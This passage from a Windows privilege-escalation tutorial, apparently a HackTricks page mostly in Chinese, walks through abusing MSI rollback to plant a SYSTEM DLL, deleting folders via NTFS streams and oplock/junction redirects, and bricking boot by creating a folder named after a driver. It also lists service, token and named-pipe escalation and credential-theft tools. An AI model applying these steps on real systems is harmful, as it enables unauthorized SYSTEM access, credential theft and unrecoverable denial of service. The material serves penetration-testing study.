2. Stage 2 – Replacing Rollback Scripts with Malicious Ones

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- 自行重新创建 `C:\Config.Msi` 文件夹。
- 设置**弱 DACL**（例如 Everyone:F），并保持一个带有 `WRITE_DAC` 的句柄打开。

- Step 7: Run Another Install
- 再次安装该 `.msi`，并设置：
- `TARGETDIR`: 可写位置。
- `ERROROUT`: 一个触发强制失败的变量。
- 该安装将用于再次触发 **rollback**，该过程会读取 `.rbs` 和 `.rbf`。

- Step 8: Monitor for `.rbs`
- 使用 `ReadDirectoryChangesW` 监控 `C:\Config.Msi`，直到出现新的 `.rbs`。
- 捕获其文件名。

- Step 9: Sync Before Rollback
- 该 `.msi` 包含一个**自定义安装动作（`SyncBeforeRollback`）**，其：
- 在 `.rbs` 创建时发出事件信号。
- 然后在继续之前**等待**。

- Step 10: Reapply Weak ACL
- 在收到 `.rbs created` 事件后：
- Windows Installer 会**重新应用强 ACL** 到 `C:\Config.Msi`。
- 但由于你仍然保持着带有 `WRITE_DAC` 的句柄，你可以**再次重新应用弱 ACL**。

> ACLs 仅在打开句柄时强制执行，所以你仍然可以写入该文件夹。

- Step 11: Drop Fake `.rbs` and `.rbf`
- 用一个**伪造的 rollback 脚本**覆盖 `.rbs`，该脚本指示 Windows：
- 将你的 `.rbf` 文件（恶意 DLL）恢复到一个**特权位置**（例如 `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）。
- 放置包含**恶意 SYSTEM 级别负载 DLL** 的伪造 `.rbf`。

- Step 12: Trigger the Rollback
- 发出同步事件信号让安装程序继续。
- 一个配置为在已知点故意失败的 **type 19 custom action（`ErrorOut`）** 会触发安装失败。
- 这会导致**rollback 开始**。

- Step 13: SYSTEM Installs Your DLL
- Windows Installer：
- 读取你恶意的 `.rbs`。
- 将你的 `.rbf` DLL 复制到目标位置。
- 现在你的**恶意 DLL 已位于 SYSTEM 加载路径**。

- Final Step: Execute SYSTEM Code
- 运行一个受信任的**auto-elevated binary**（例如 `osk.exe`）来加载你劫持的 DLL。
- 成功：你的代码以 **SYSTEM** 身份执行。

### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

主要的 MSI rollback 技术（前述方法）假设你可以删除一个**整个文件夹**（例如 `C:\Config.Msi`）。但如果你的漏洞只允许**任意文件删除**呢？

你可以利用 **NTFS internals**：每个文件夹都有一个隐藏的备用数据流（alternate data stream），称为：
```
C:\SomeFolder::$INDEX_ALLOCATION
```
这个流存储了文件夹的 **索引元数据**。

因此，如果你 **删除文件夹的 `::$INDEX_ALLOCATION` 流**，NTFS **会从文件系统中移除整个文件夹**。

你可以使用诸如以下的标准文件删除 APIs 来执行此操作：
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> 即便你调用的是 *file* delete API，它**删除的是 folder 本身**。

### 从 Folder Contents Delete 到 SYSTEM EoP
如果你的 primitive 不允许你删除任意 files/folders，但它**确实允许删除攻击者控制的 folder 的 *contents*？**

1. Step 1: 设置一个诱饵 folder 和 file
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Step 2: 在 `file1.txt` 上放置一个 **oplock**
- 当一个有特权的进程尝试删除 `file1.txt` 时，oplock 会**暂停执行**。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. 步骤 3：触发 SYSTEM 进程 (例如 `SilentCleanup`)
- 此进程会扫描文件夹 (例如 `%TEMP%`) 并尝试删除其内容。
- 当它到达 `file1.txt` 时，**oplock triggers** 并将控制权交给你的回调。

4. 步骤 4：Inside the oplock callback – redirect the deletion

- 选项 A：将 `file1.txt` 移到别处
- 这样可以清空 `folder1`，而不会破坏 oplock。
- 不要直接删除 `file1.txt` — 那会提前释放 oplock。

- 选项 B：将 `folder1` 转换为 **junction**：
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- 选项 C：在 `\RPC Control` 创建一个 **symlink**：
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> 这针对存储文件夹元数据的 NTFS internal stream — 删除它会删除该文件夹。

5. 第5步：释放 oplock
- SYSTEM 进程继续并尝试删除 `file1.txt`。
- 但现在，由于 junction + symlink，它实际上正在删除：
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**结果**: `C:\Config.Msi` 已被 SYSTEM 删除。

### 从任意文件夹创建到永久 DoS

利用一个原语，允许你**以 SYSTEM/admin 身份创建任意文件夹**——即使你**无法写入文件**或**无法设置弱权限**。

创建一个**文件夹**（不是文件），其名称为一个**关键 Windows 驱动程序**，例如：
```
C:\Windows\System32\cng.sys
```
- 此路径通常对应于内核模式驱动 `cng.sys`。
- 如果你**事先将其创建为文件夹**，Windows 在启动时无法加载实际驱动。
- 随后，Windows 在启动时尝试加载 `cng.sys`。
- 它看到该文件夹，**无法解析实际驱动**，并且**崩溃或停止启动**。
- 没有**回退机制**，且在没有外部干预（例如，启动修复或磁盘访问）的情况下**无法恢复**。


## **从 High Integrity 到 System**

### **新服务**

如果你已经在一个 High Integrity 进程中运行，**到 SYSTEM 的路径**可能很简单，只需**创建并执行一个新服务**：
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> 在创建 service binary 时，确保它是一个有效的 service，或者二进制能够足够快地执行必要的操作，否则如果不是有效的 service，会在 20 秒内被终止。

### AlwaysInstallElevated

从 High Integrity 进程你可以尝试 **enable the AlwaysInstallElevated registry entries** 并使用 _**.msi**_ 包装器 **install** 一个反向 shell。\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**你可以** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

如果你拥有那些 token 权限（很可能你会在已经是 High Integrity 的进程中发现它们），你将能够使用 SeDebug 权限**打开几乎任何进程**（非受保护进程）、**复制该进程的 token**，并使用该 token **创建任意进程**。\
使用该技术时通常会**选择任何以 SYSTEM 运行且具有所有 token 权限的进程**（_是的，你可以找到没有所有 token 权限的 SYSTEM 进程_）。\
**你可以** [**find an example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

该技术被 meterpreter 在 `getsystem` 提权中使用。该技术包括**创建一个 pipe 然后创建/滥用一个 service 向该 pipe 写入**。随后，使用 **`SeImpersonate`** 权限创建该 pipe 的 **server** 将能够**模拟 pipe client（即该 service）的 token**，从而获得 SYSTEM 权限。\
如果你想要 [**learn more about name pipes you should read this**](#named-pipe-client-impersonation)。\
如果你想阅读一个示例 [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

如果你设法**hijack a dll**，并且该 dll 被以 **SYSTEM** 运行的 **process** 加载，你将能够以这些权限执行任意代码。因此 Dll Hijacking 对这类提权也很有用，而且从 High Integrity 进程实现起来通常**更容易**，因为它对用于加载 dll 的文件夹具有**写权限**。\
**你可以** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

- **阅读：** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**查找 Windows 本地提权向量的最佳工具：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Check for misconfigurations and sensitive files (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Check for some possible misconfigurations and gather info (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Check for misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information. Use -Thorough in local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extracts crendentials from Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray gathered passwords across domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is a PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer and man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Search for known privesc vulnerabilities (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Search for known privesc vulnerabilities (needs to be compiled using VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerates the host searching for misconfigurations (more a gather info tool than privesc) (needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extracts credentials from lots of softwares (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port of PowerUp to C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Check for misconfiguration (executable precompiled in github). Not recommended. It does not work well in Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Check for possible misconfigurations (exe from python). Not recommended. It does not work well in Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool created based in this post (it does not need accesschk to work properly but it can use it).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Reads the output of **systeminfo** and recommends working exploits (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Reads the output of **systeminfo** andrecommends working exploits (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

你必须使用正确版本的 .NET 来编译该项目（[see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。要查看受害主机上已安装的 .NET 版本，你可以执行：
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考资料

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
